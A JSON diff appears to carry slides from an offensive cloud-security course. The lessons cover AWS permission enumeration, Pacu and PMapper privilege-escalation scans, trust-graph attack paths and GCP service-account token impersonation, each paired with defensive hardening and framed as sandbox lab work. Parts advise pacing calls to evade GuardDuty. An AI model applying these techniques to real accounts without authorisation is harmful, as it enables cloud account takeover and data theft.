+            "body": "How to test (in an authorised lab): once you hold a key, confirm what it is before acting. Run 'aws sts get-caller-identity' - it is a quiet, read-only call that proves the key works and tells you the principal. Never spray a found key across accounts you don't own.\n\nDefend / harden:\n- Prefer short-lived credentials everywhere: IAM Identity Center (SSO), role assumption, IRSA for EKS - kill long-lived AKIA keys.\n- Enforce IMDSv2 (session-token required) so SSRF cannot trivially read role creds; set HttpTokens=required.\n- Run secret scanning in CI and on push; rotate any exposed key immediately (deleting the file is not enough).\n- Use AWS GuardDuty and credential-exfil detections; scope keys tightly so a leak has small blast radius.\n\nWhy it matters: initial access is the hinge of the whole kill chain. Footprinting is noise until one real credential turns it into account access - which is why 'where do keys leak' is the highest-leverage question in cloud security for both sides."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m3-3",
+        "moduleId": "cloud-m3",
+        "number": 17,
+        "title": "Authenticated AWS Enumeration",
+        "type": "lab",
+        "week": 1,
+        "description": "With one credential in hand, map everything it can see. Students enumerate the account's identities, policies, resources and the permissions of their own principal.",
+        "keyPoints": [
+          "Whoami: 'aws sts get-caller-identity' then enumerate attached policies",
+          "enumerate-iam and aws CLI brute-forcing of allowed actions",
+          "Listing resources across services (S3, EC2, Lambda, RDS, Secrets Manager)",
+          "Finding roles you can assume and building a privilege-escalation lead list",
+          "Avoiding noisy calls that trip GuardDuty during an authorised assessment"
+        ],
+        "slides": [
+          {
+            "title": "What Authenticated Enumeration Is",
+            "body": "Authenticated enumeration is the 'what can this key actually see and do?' phase. You hold one credential and you map everything reachable from it: your own identity, your permissions, the account's resources, and the roles you might pivot to.\n\nAnalogy: you have a keycard to an office, but no map and no idea what doors it opens. So you walk the halls, try each door gently, and build the floor plan from what opens.\n\nThis is a lab topic. The core discipline: enumerate thoroughly but quietly, because real accounts have detection (GuardDuty, CloudTrail) watching for exactly this behaviour."
+          },
+          {
+            "title": "Step 1 - Whoami in the Cloud",
+            "body": "Before anything, establish identity. 'aws sts get-caller-identity' answers three questions in one quiet call: which account, which principal, and what ARN. From the ARN you learn whether you are a user or an assumed role, and the account number anchors everything else.\n\nIt is also the cleanest way to confirm the key is live and not expired or rotated.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws sts get-caller-identity",
+                  "output": "{\n  \"UserId\": \"AIDA...EXAMPLE\",\n  \"Account\": \"123456789012\",\n  \"Arn\": \"arn:aws:iam::123456789012:user/ci-deploy\"\n}"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Step 2 - Enumerate Your Own Permissions",
+            "body": "You rarely get a tidy list of what you can do - IAM permissions are scattered across user policies, group policies, and inline policies. Two approaches:\n\n1) Read the policies directly if you have iam:List*/Get* (aws iam list-attached-user-policies, get-user-policy).\n2) When you cannot read IAM, brute-force behaviourally. A tool like enumerate-iam calls hundreds of harmless describe/list/get APIs and records which return data versus AccessDenied. The successes ARE your permission set.\n\nThe brute-force approach works even against a principal that cannot read its own policies - it infers permissions from how the API responds.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "enumerate-iam --access-key AKIA... --secret-key ... --region us-east-1",
+                  "output": "[+] sts.get_caller_identity ALLOWED\n[+] s3.list_buckets ALLOWED\n[+] ec2.describe_instances ALLOWED\n[+] iam.list_users ALLOWED\n[-] iam.create_user DENIED\n[+] lambda.list_functions ALLOWED"
+                }
+              ]
+            },
+            "check": {
+              "question": "How does a tool like enumerate-iam determine permissions for a principal that cannot read its own IAM policies?",
+              "options": [
+                "It reads the account's CloudTrail logs",
+                "It calls many non-destructive list/describe/get APIs and infers permission from AccessDenied vs a successful response",
+                "It assumes the AdministratorAccess role",
+                "It decrypts the IAM policy store"
+              ],
+              "correctIndex": 1,
+              "explanation": "Behavioural brute-forcing fires harmless read APIs and treats a non-denied response as proof the action is allowed - no ability to read IAM policies is required."
+            }
+          },
+          {
+            "title": "Step 3 - List Resources Across Services",
+            "body": "Now inventory what exists. Walk the high-value services: S3 (data), EC2 (compute and metadata creds), Lambda (code and roles), RDS (databases), and Secrets Manager / SSM Parameter Store (credentials for lateral movement).\n\nSecrets Manager is often the jackpot - if your key can read secrets, you may find database passwords, API tokens, or other cloud keys that widen your reach instantly.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3 ls",
+                  "output": "2024-02-11 example-app-prod\n2023-09-02 example-tfstate"
+                },
+                {
+                  "command": "aws secretsmanager list-secrets --query 'SecretList[].Name'",
+                  "output": "[ \"prod/db/password\", \"stripe/api-key\" ]"
+                },
+                {
+                  "command": "aws lambda list-functions --query 'Functions[].FunctionName'",
+                  "output": "[ \"invoice-processor\", \"admin-task-runner\" ]"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Step 4 - Find Roles You Can Assume",
+            "body": "The payoff of enumeration is a privilege-escalation lead list. List IAM roles, then read each role's trust policy to see whether YOUR principal is allowed to assume it. A role with broad permissions and a loose trust policy is a direct pivot.\n\nAlso flag the dangerous verbs you hold: iam:PassRole (hand a powerful role to a service you control), lambda:UpdateFunctionCode (run code as a function's role), iam:CreatePolicyVersion, iam:AttachUserPolicy. Each is a known escalation primitive explored in the next module. Right now you just collect the leads.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "me",
+                  "label": "user/ci-deploy (foothold)",
+                  "highlighted": true
+                },
+                {
+                  "id": "deploy",
+                  "label": "role/deploy-role"
+                },
+                {
+                  "id": "admin",
+                  "label": "role/org-admin",
+                  "highlighted": true
+                },
+                {
+                  "id": "lambda",
+                  "label": "lambda:admin-task-runner"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "me",
+                  "to": "deploy",
+                  "label": "sts:AssumeRole (trust allows)"
+                },
+                {
+                  "from": "me",
+                  "to": "lambda",
+                  "label": "lambda:UpdateFunctionCode"
+                },
+                {
+                  "from": "lambda",
+                  "to": "admin",
+                  "label": "function's role is admin"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Nuance - Stay Under the Radar",
+            "body": "Enumeration is noisy if you are careless, and real accounts watch for it. AWS GuardDuty raises findings like Recon:IAMUser/* and the 'anomalous API call' detections when a principal suddenly fires hundreds of list/describe calls or uses credentials from a new location.\n\nTo stay quiet during an authorised assessment:\n- Pace calls; avoid firing an entire brute-force list at once.\n- Prefer targeted reads over spraying every API in every region.\n- Remember every call lands in CloudTrail - management-event reads for IAM and S3 data events can all be logged.\n- Temporary (ASIA) creds from a role may blend in better than a brand-new AKIA user key logging in from an odd IP.\n\nThe goal is realism: a good assessment shows what an attacker could do AND whether the blue team would have seen it."
+          },
+          {
+            "title": "Do It, Defend It, Why It Matters",
+            "body": "Do it - module lab 'One Key, Full Map' (AWS free tier + Pacu): start from one low-privilege access key, enumerate the entire account, and produce a ranked list of privilege-escalation leads. Run get-caller-identity, then enumerate-iam or Pacu's iam__enum_permissions, then inventory resources, then collect assumable-role and PassRole leads.\n\nDefend / harden:\n- Enforce least privilege so a stolen key sees almost nothing (next-module theme).\n- Turn on GuardDuty and CloudTrail in all regions, with alerting on Recon findings and unusual AssumeRole.\n- Use IAM Access Analyzer to catch roles that trust external or over-broad principals.\n- Scope iam:PassRole with iam:PassedToService and specific resource ARNs.\n\nWhy it matters: enumeration converts a foothold into a plan. The difference between a minor key leak and a full account takeover is whether that one principal could reach an admin-equivalent role - and you only learn that by mapping it. For defenders, assuming 'they'll enumerate instantly' is the right mindset: the key's blast radius is whatever it can enumerate and assume."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m3-4",
+        "moduleId": "cloud-m3",
+        "number": 18,
+        "title": "Cloud Recon Tooling",
+        "type": "lab",
+        "week": 1,
+        "description": "A tour of the standard open-source arsenal with when-to-use-which guidance. Students run each against their sandbox and compare coverage.",
+        "keyPoints": [
+          "Pacu (AWS exploitation framework) modules for enumeration and escalation",
+          "ScoutSuite and Prowler for multi-service posture enumeration",
+          "CloudMapper / Cartography for building a graph of the estate",
+          "enumerate-iam, weirdAAL for permission brute-forcing",
+          "PMapper for principal-to-admin reachability analysis"
+        ],
+        "slides": [
+          {
+            "title": "What Cloud Recon Tooling Is",
+            "body": "You can enumerate a cloud account by hand with the AWS CLI, but it is slow and easy to miss edges. Purpose-built tools automate coverage and turn raw API output into findings. This topic is a tour of the standard open-source arsenal and, more importantly, when to reach for which.\n\nAnalogy: the CLI is a flashlight you point one door at a time. These tools are a drone that maps the whole floor plan at once. The skill is not running them - it is reading their output critically, because each has blind spots and false positives.\n\nThe tools split into four jobs: exploitation (Pacu), posture audit (ScoutSuite, Prowler), graphing the estate (Cartography, CloudMapper), and reachability analysis (PMapper, enumerate-iam, weirdAAL)."
+          },
+          {
+            "title": "Pacu - The AWS Exploitation Framework",
+            "body": "Pacu (by Rhino Security Labs) is the Metasploit of AWS. You import a key as a 'session', then run modules. For recon the key modules are iam__enum_permissions (works out what your principal can do), iam__enum_users_roles_policies_groups (maps identities), and iam__privesc_scan (checks your permissions against the known escalation primitives and tells you which paths are open).\n\nPacu stores everything in its session database so later modules reuse earlier findings - enumerate once, pivot many times.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "Pacu>",
+              "lines": [
+                {
+                  "command": "run iam__enum_permissions",
+                  "output": "[+] Confirmed permissions for user: ci-deploy\n[+] 34 allowed actions enumerated"
+                },
+                {
+                  "command": "run iam__privesc_scan",
+                  "output": "[+] Checking privesc methods...\n[+] CONFIRMED: PassExistingRoleToNewLambdaThenInvoke\n[+] CONFIRMED: CreateAccessKey (on other users)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "ScoutSuite and Prowler - Posture Audit",
+            "body": "Where Pacu is offensive, ScoutSuite and Prowler are auditors. They enumerate configuration across many services and flag misconfigurations: public buckets, unencrypted volumes, permissive security groups, roles with wildcard trust.\n\nScoutSuite (NCC Group) outputs a browsable HTML report. Prowler runs hundreds of checks mapped to CIS Benchmarks, PCI, NIST, and the AWS Foundational Security Best Practices - useful both for attackers finding weak spots and defenders measuring compliance. Prowler covers AWS, Azure, GCP and Kubernetes.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "prowler aws --services iam s3 --output-formats csv",
+                  "output": "FAIL iam_root_hardware_mfa_enabled\nFAIL s3_bucket_public_access (example-backups)\nPASS iam_password_policy_minimum_length_14\nFAIL ec2_instance_imdsv2_enabled (i-0a1b2c3d)"
+                }
+              ]
+            },
+            "check": {
+              "question": "You want a misconfiguration report mapped to CIS Benchmarks across IAM and S3. Which tool fits best?",
+              "options": [
+                "Pacu iam__privesc_scan",
+                "Prowler (or ScoutSuite) posture scanning",
+                "PMapper reachability query",
+                "trufflehog secret scan"
+              ],
+              "correctIndex": 1,
+              "explanation": "Prowler and ScoutSuite are posture/compliance auditors that enumerate config and map findings to frameworks like CIS. Pacu is for exploitation; PMapper is for identity reachability; trufflehog finds secrets."
+            }
+          },
+          {
+            "title": "Cartography and CloudMapper - Graph the Estate",
+            "body": "Lists of resources hide relationships. Graph tools model the account as nodes (principals, resources) and edges (trusts, can-read, can-assume) so you can see paths, not just items.\n\nCartography (Lyft) ingests AWS (and GitHub, GCP, Okta, and more) into a Neo4j graph database you query with Cypher. CloudMapper (Duo) focuses on network reachability and draws a visual map of what can talk to what. Graphing is where enumeration stops being a spreadsheet and becomes an attack-path finder - the subject of the next topic.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Enumerate",
+                  "detail": "Cartography pulls account data via API"
+                },
+                {
+                  "label": "Load",
+                  "detail": "nodes + edges written into Neo4j"
+                },
+                {
+                  "label": "Query",
+                  "detail": "Cypher finds paths, e.g. principal -> admin"
+                },
+                {
+                  "label": "Visualise",
+                  "detail": "graph shows the dangerous edges"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Permission and Reachability Tools",
+            "body": "Three focused tools fill gaps:\n\n- enumerate-iam and weirdAAL brute-force which API actions your key can call, by firing non-destructive calls and reading allow/deny. Great when you cannot read your own IAM policies.\n- PMapper (Principal Mapper, NCC Group) builds an in-memory graph of IAM identities and computes reachability: 'can principal X become admin?' It understands escalation edges like PassRole and is purpose-built to answer the privesc question directly.\n\nPMapper's preset queries are the fastest way to turn enumeration into a verdict.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "pmapper graph create",
+                  "output": "Graph created for account 123456789012 (42 nodes)"
+                },
+                {
+                  "command": "pmapper query 'preset privesc user/ci-deploy'",
+                  "output": "user/ci-deploy CAN escalate to admin via:\n  lambda:CreateFunction + iam:PassRole(role/lambda-admin)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "When to Use Which",
+            "body": "No single tool does everything. Match the tool to the question you are answering - and cross-check, because each misses things the others catch.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Attack / escalate",
+                  "points": [
+                    "Pacu - modules + session store",
+                    "enumerate-iam / weirdAAL - permission brute-force",
+                    "PMapper - 'can I reach admin?'"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Audit / defend / map",
+                  "points": [
+                    "Prowler / ScoutSuite - posture vs CIS/NIST",
+                    "Cartography - Neo4j estate graph",
+                    "CloudMapper - network reachability picture"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It, Read Critically, Why It Matters",
+            "body": "Do it - in the module lab 'One Key, Full Map' you run Pacu against a sandbox: import the key, iam__enum_permissions, then iam__privesc_scan, and compare against a manual enumerate-iam pass to catch anything Pacu missed.\n\nRead output critically:\n- Posture tools produce false positives (a 'public' bucket may be fronted by an allowlist). Verify before reporting.\n- Brute-forcers miss write-only or conditional permissions that only reveal themselves on a real call.\n- Graph tools are only as current as their last ingest - stale data hides new edges.\n\nDefend / harden: these same tools are your blue-team kit. Run Prowler on a schedule, feed Cartography/PMapper to find escalation edges before attackers do, and alert when a new role gains a known privesc primitive.\n\nWhy it matters: tooling scales recon from one principal to an entire estate in minutes. The professional edge is knowing each tool's job and blind spot, so you pick the right lens and trust the output only as far as it has earned."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m3-5",
+        "moduleId": "cloud-m3",
+        "number": 19,
+        "title": "Building the Identity & Trust Graph",
+        "type": "exercise",
+        "week": 1,
+        "description": "The conceptual payoff: turn raw enumeration into a graph of principals, roles, trust edges and resource access, then read it for attack paths.",
+        "keyPoints": [
+          "Nodes = principals and resources; edges = can-assume, can-read-secret, can-pass-role",
+          "Cartography (Neo4j) and PMapper to compute reachability to admin",
+          "Identifying privilege-escalation edges (iam:PassRole, sts:AssumeRole, lambda:UpdateFunctionCode)",
+          "Finding the shortest path from your foothold to an admin-equivalent principal",
+          "Exporting the graph as evidence for a defender to cut the edge"
+        ],
+        "slides": [
+          {
+            "title": "What the Identity & Trust Graph Is",
+            "body": "A trust graph turns a pile of enumeration data into a map of who can become whom. Instead of a flat list of users, roles and buckets, you draw them as nodes and connect them with edges that mean 'can assume', 'can read this secret', or 'can pass this role'.\n\nAnalogy: enumeration gives you a phone book - every person and department. The graph gives you the org chart plus every informal favour one person can call in from another. Attackers don't care about the list; they care about the path from where they stand to the crown jewels.\n\nThis is the conceptual payoff of the whole module: the graph is where 'I have a low-priv key' becomes 'I have a four-hop path to admin'."
+          },
+          {
+            "title": "Nodes and Edges",
+            "body": "Keep the model simple. Nodes are things that have or hold privilege: principals (users, roles) and resources (buckets, secrets, functions). Edges are the permissions that connect them - and the edges are where danger lives.\n\nThe edges worth drawing are the ones that move you upward: can-assume (sts:AssumeRole), can-read-secret (secretsmanager:GetSecretValue), can-pass-role (iam:PassRole), and can-run-code-as (lambda:UpdateFunctionCode). A chain of these is an attack path.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "u",
+                  "label": "user/ci-deploy (you)",
+                  "highlighted": true
+                },
+                {
+                  "id": "s",
+                  "label": "secret: prod/db"
+                },
+                {
+                  "id": "r1",
+                  "label": "role/deploy"
+                },
+                {
+                  "id": "r2",
+                  "label": "role/admin",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "u",
+                  "to": "s",
+                  "label": "can-read-secret"
+                },
+                {
+                  "from": "u",
+                  "to": "r1",
+                  "label": "can-assume"
+                },
+                {
+                  "from": "r1",
+                  "to": "r2",
+                  "label": "can-pass-role + run code"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Building the Graph with Cartography",
+            "body": "Cartography ingests the account via API and writes nodes and edges into Neo4j, a graph database. Once loaded, you query it with Cypher - a language built for 'find a path from A to B'. PMapper does a focused version of the same thing purely for IAM reachability.\n\nThe build is three steps: pull the data, load it, then query. The power is that Cypher can traverse arbitrary-length chains ([*1..5]) so it finds multi-hop paths a human would miss.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "cartography --neo4j-uri bolt://localhost:7687 --aws-sync",
+                  "output": "Syncing AWS account 123456789012...\nLoaded 1,284 nodes, 3,902 relationships into Neo4j"
+                }
+              ]
+            },
+            "check": {
+              "question": "Why model a cloud account as a graph rather than querying flat resource lists?",
+              "options": [
+                "Graph databases are the only way to call the AWS API",
+                "Edges capture relationships, so you can traverse multi-hop paths (e.g. foothold -> role -> admin) that flat lists hide",
+                "Graphs automatically remediate misconfigurations",
+                "Neo4j encrypts the credentials for you"
+              ],
+              "correctIndex": 1,
+              "explanation": "The value is relationships. Attack paths are chains of permissions; a graph lets you traverse those chains, while a flat list shows items in isolation."
+            }
+          },
+          {
+            "title": "Spotting Privilege-Escalation Edges",
+            "body": "Not every edge matters. The dangerous ones let a principal increase its own privilege. Learn to recognise them on sight:\n\n- iam:PassRole (+ a service that assumes it) - hand a powerful role to Lambda/EC2/Glue and inherit it.\n- sts:AssumeRole on an over-trusting role - step directly into more power.\n- lambda:UpdateFunctionCode - overwrite a function that runs as an admin role, then trigger it.\n- iam:CreatePolicyVersion / AttachUserPolicy - grant yourself AdministratorAccess.\n\nIn the graph these are the edges you highlight. The next slide chains them into a path.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "f",
+                  "label": "foothold principal",
+                  "highlighted": true
+                },
+                {
+                  "id": "l",
+                  "label": "lambda:admin-runner"
+                },
+                {
+                  "id": "role",
+                  "label": "role/lambda-admin",
+                  "highlighted": true
+                },
+                {
+                  "id": "org",
+                  "label": "AdministratorAccess"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "f",
+                  "to": "l",
+                  "label": "lambda:UpdateFunctionCode"
+                },
+                {
+                  "from": "l",
+                  "to": "role",
+                  "label": "runs as"
+                },
+                {
+                  "from": "role",
+                  "to": "org",
+                  "label": "has policy"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Finding the Shortest Path to Admin",
+            "body": "The headline query: what is the shortest chain of edges from my foothold to an admin-equivalent principal? Cypher's shortestPath over the escalation edges answers it directly. PMapper's 'preset privesc' does the same with a single command.\n\nThe output is your attack plan - and, handed to a defender, the exact edge to cut.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "neo4j>",
+              "lines": [
+                {
+                  "command": "MATCH p=shortestPath((a:AWSUser {name:'ci-deploy'})-[:CAN_ASSUME|CAN_PASS_ROLE|CAN_UPDATE_CODE*1..6]->(admin:AWSRole {admin:true})) RETURN p",
+                  "output": "ci-deploy -[CAN_UPDATE_CODE]-> lambda/admin-runner -[RUNS_AS]-> role/lambda-admin  (admin)\n1 path, length 2"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It and Export as Evidence",
+            "body": "Do it - module lab 'Graph the Estate' (local Docker: Cartography + Neo4j against an AWS sandbox): ingest a sandbox account into Neo4j, then write a Cypher query that returns the shortest path from a given foothold principal to admin. Compare it against PMapper's privesc preset to confirm.\n\nExport as evidence: a graph is persuasive to defenders because it shows the chain, not just a single finding. Export the path (screenshot the subgraph or dump the node/edge list) and annotate the one edge whose removal breaks it. 'Remove iam:UpdateFunctionCode from ci-deploy, or scope it' is far more actionable than 'ci-deploy is over-privileged'.\n\nThis is the handoff that makes offensive graphing valuable to the blue team."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Individual misconfigurations are often shrugged off ('so what if ci-deploy can edit a Lambda?'). The graph is what proves impact: that one edge, chained with two others, reaches full admin. Severity lives in the path, not the node.\n\nFor attackers, the shortest-path query is the difference between aimless poking and a surgical escalation. For defenders, the same graph is the cheapest way to find and cut the one edge that collapses an attack chain - and to prove a fix actually broke the path.\n\nThis is why mature cloud security teams run continuous graphing (Cartography/PMapper on a schedule): the estate changes daily, and every new role or policy can quietly open a new path to the crown jewels."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m3-6",
+        "moduleId": "cloud-m3",
+        "number": 20,
+        "title": "Azure & GCP Enumeration (Primer)",
+        "type": "theory",
+        "week": 1,
+        "description": "Cross-provider recon so skills transfer. Introduces the equivalent tooling and the identity constructs to enumerate in Entra ID and GCP.",
+        "keyPoints": [
+          "Azure: roadrecon, AzureHound, ScoutSuite; enumerate Entra ID and role assignments",
+          "GCP: gcloud enumeration, GCPBucketBrute, ScoutSuite; service-account impersonation edges",
+          "Azure managed identities and app registrations as targets",
+          "GCP service-account keys and the actAs / impersonation path",
+          "BloodHound-style graph thinking applies across all three clouds"
+        ],
+        "slides": [
+          {
+            "title": "What Cross-Provider Enumeration Is",
+            "body": "AWS is not the only cloud, and your recon skills should transfer. This primer maps the AWS mental model onto Microsoft Azure (with Entra ID) and Google Cloud (GCP) so you can enumerate any of the three.\n\nAnalogy: once you can read one city's subway map, a second city is faster - the concepts (lines, stops, transfers) carry over even though the names differ. Principals, roles and 'who can act as whom' exist everywhere; only the vocabulary and tooling change.\n\nThe big idea that unifies all three: graph thinking (BloodHound-style) applies across clouds. You are always hunting edges from your foothold to a high-privilege identity."
+          },
+          {
+            "title": "Same Idea, Different Words",
+            "body": "The identity constructs line up closely. Learn the translation table and most of your AWS instincts carry over.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS",
+                  "points": [
+                    "IAM users / roles",
+                    "sts:AssumeRole",
+                    "iam:PassRole",
+                    "Account",
+                    "S3 bucket"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Azure / Entra ID",
+                  "points": [
+                    "Users / service principals / managed identities",
+                    "RBAC role assignment",
+                    "App registration + credentials",
+                    "Subscription / mgmt group",
+                    "Blob container"
+                  ]
+                },
+                {
+                  "label": "GCP",
+                  "points": [
+                    "Users / service accounts",
+                    "Service-account impersonation (actAs)",
+                    "SA key / token mint",
+                    "Project (org->folder->project)",
+                    "GCS bucket"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Enumerating Azure and Entra ID",
+            "body": "Azure splits into two planes: the control plane (Azure Resource Manager - subscriptions, resource groups, RBAC role assignments) and the identity plane (Entra ID, formerly Azure AD - users, groups, service principals, app registrations).\n\nTooling: roadrecon dumps the entire Entra tenant into a local database you browse offline; AzureHound collects identities and relationships for BloodHound graphing; ScoutSuite audits posture. Prime targets are managed identities (credential-free identities attached to resources) and app registrations whose secrets grant tenant access.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "roadrecon auth -u analyst@example.com && roadrecon gather",
+                  "output": "Dumping users, groups, serviceprincipals, approles...\nStored 4,102 objects in roadrecon.db"
+                },
+                {
+                  "command": "az role assignment list --assignee <sp-id> -o table",
+                  "output": "Role            Scope\nContributor     /subscriptions/8f.../resourceGroups/prod"
+                }
+              ]
+            },
+            "check": {
+              "question": "In Azure/Entra ID, which target is roughly analogous to an AWS instance profile's role - an identity attached to a resource that needs no stored secret?",
+              "options": [
+                "An app registration client secret",
+                "A managed identity",
+                "A storage account key",
+                "A subscription"
+              ],
+              "correctIndex": 1,
+              "explanation": "A managed identity is attached to an Azure resource and gets tokens automatically without stored credentials - the closest parallel to an EC2 instance profile role."
+            }
+          },
+          {
+            "title": "Enumerating GCP",
+            "body": "GCP's identity revolves around service accounts (SAs) and a resource hierarchy where IAM bindings are inherited org -> folder -> project -> resource. The gcloud CLI is your primary enumerator; GCPBucketBrute permutes GCS bucket names; ScoutSuite audits posture.\n\nThe signature escalation path is impersonation: if your identity has iam.serviceAccounts.getAccessToken (or actAs) on a more privileged SA, you can mint that SA's token and inherit its permissions - GCP's equivalent of AssumeRole abuse.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "gcloud projects get-iam-policy my-project --format=json | jq '.bindings[]'",
+                  "output": "{ \"role\": \"roles/editor\", \"members\": [\"serviceAccount:ci@my-project.iam.gserviceaccount.com\"] }"
+                },
+                {
+                  "command": "gcloud auth print-access-token --impersonate-service-account=admin-sa@my-project.iam.gserviceaccount.com",
+                  "output": "ya29.a0Af... (token for admin-sa minted)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Impersonation Edges Across Clouds",
+            "body": "Each cloud has its 'become someone more powerful' edge. Recognising the equivalent primitive in each is the whole point of a cross-provider primer.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "you",
+                  "label": "your foothold identity",
+                  "highlighted": true
+                },
+                {
+                  "id": "aws",
+                  "label": "AWS: assume role"
+                },
+                {
+                  "id": "az",
+                  "label": "Azure: abuse SP / managed identity"
+                },
+                {
+                  "id": "gcp",
+                  "label": "GCP: impersonate SA",
+                  "highlighted": true
+                },
+                {
+                  "id": "admin",
+                  "label": "high-privilege principal",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "you",
+                  "to": "aws",
+                  "label": "sts:AssumeRole"
+                },
+                {
+                  "from": "you",
+                  "to": "az",
+                  "label": "RBAC / app creds"
+                },
+                {
+                  "from": "you",
+                  "to": "gcp",
+                  "label": "actAs / getAccessToken"
+                },
+                {
+                  "from": "aws",
+                  "to": "admin",
+                  "label": "->"
+                },
+                {
+                  "from": "az",
+                  "to": "admin",
+                  "label": "->"
+                },
+                {
+                  "from": "gcp",
+                  "to": "admin",
+                  "label": "->"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Graph Thinking Is Universal",
+            "body": "BloodHound started in on-prem Active Directory and now powers AzureHound; Cartography ingests AWS, GCP and Okta; PMapper graphs AWS IAM. The common thread: in every environment you reduce the estate to principals, edges and a target, then find the shortest path.\n\nSo the transferable skill is not memorising each CLI - it is asking the same question in each cloud: 'from here, what identity can I become, and does any chain of those reach an admin?' The tools differ; the question does not.\n\nAzure note: watch RBAC role assignments (Owner/Contributor at subscription scope) and app registrations with overly broad Graph API permissions. GCP note: watch broad SA impersonation and the editor/owner primitive roles on parent folders that inherit downward."
+          },
+          {
+            "title": "Defend, and Why It Matters",
+            "body": "Defend / harden (the controls mirror AWS):\n- Azure: prefer managed identities over stored app secrets; scope RBAC tightly; monitor Entra sign-in and audit logs; use Conditional Access and PIM (just-in-time elevation).\n- GCP: avoid long-lived SA keys (use workload identity federation); restrict iam.serviceAccounts.actAs; watch for primitive roles (owner/editor) high in the hierarchy; enable Security Command Center.\n- All: run posture tooling (ScoutSuite, Prowler) and graph tooling continuously, and alert on new impersonation/assumption edges.\n\nWhy it matters: multi-cloud is now the norm, and attackers follow identities across provider boundaries - a leaked GCP SA key or an over-scoped Entra app can be the softest way in. A tester who only knows AWS leaves two-thirds of the estate unexamined. The identity graph is the shared language that lets one skill set defend, and attack, all three clouds."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m4",
+    "name": "IAM Attacks & Privilege Escalation",
+    "shortName": "IAM Attacks & PrivEsc",
+    "month": 2,
+    "weeks": [
+      2
+    ],
+    "description": "The core offensive module: turning a weak foothold into account takeover through identity. Students work through the canonical IAM privilege-escalation primitives, role-assumption abuse, policy-based escalation and persistence, all against sandboxes they own.",
+    "estimatedHours": 13,
+    "outcomes": [
+      "Execute the classic IAM privilege-escalation techniques (PassRole, policy versioning, inline policy, CreateAccessKey)",
+      "Abuse over-permissive AssumeRole trust policies and confused-deputy conditions",
+      "Establish and detect identity-based persistence in a cloud account",
+      "Translate each escalation primitive into the exact IAM condition or SCP that prevents it"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m4-1",
+        "moduleId": "cloud-m4",
+        "number": 21,
+        "title": "The Privilege-Escalation Catalogue",
+        "type": "theory",
+        "week": 2,
+        "description": "Enumerates the well-known IAM escalation primitives documented by Rhino Security Labs. Each is a specific over-permission that lets a principal grant itself more.",
+        "keyPoints": [
+          "iam:CreateAccessKey on another user; iam:CreatePolicyVersion / SetDefaultPolicyVersion",
+          "iam:AttachUserPolicy / PutUserPolicy to attach AdministratorAccess",
+          "iam:PassRole combined with a service that assumes the passed role (ec2, lambda, glue)",
+          "iam:UpdateAssumeRolePolicy to make a privileged role assumable by you",
+          "sts:AssumeRole on an over-trusting role; the 21 Rhino escalation methods as a checklist"
+        ],
+        "slides": [
+          {
+            "title": "What IAM privilege escalation is",
+            "body": "In AWS, every action is gated by IAM (Identity and Access Management) permissions. **Privilege escalation** means a principal (a user or role) who was given a small set of permissions uses one of those permissions to grant itself more — ending up with far more power than intended, often full administrator.\n\nAnalogy: imagine an office keycard that only opens the supply closet. But inside that closet is the machine that programs keycards. Now the 'supply closet only' badge can print a master key for the whole building. The badge never changed — the mistake was putting the key-making machine behind a door the badge could open.\n\nThat is exactly what an over-permissive IAM policy does: it hands out a permission that can be turned on itself. The **Privilege-Escalation Catalogue** is the list of these dangerous permissions, first documented by Rhino Security Labs as '21 ways to escalate privileges in AWS'.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Weak foothold",
+                  "detail": "Leaked key for a low-priv user"
+                },
+                {
+                  "label": "Dangerous permission",
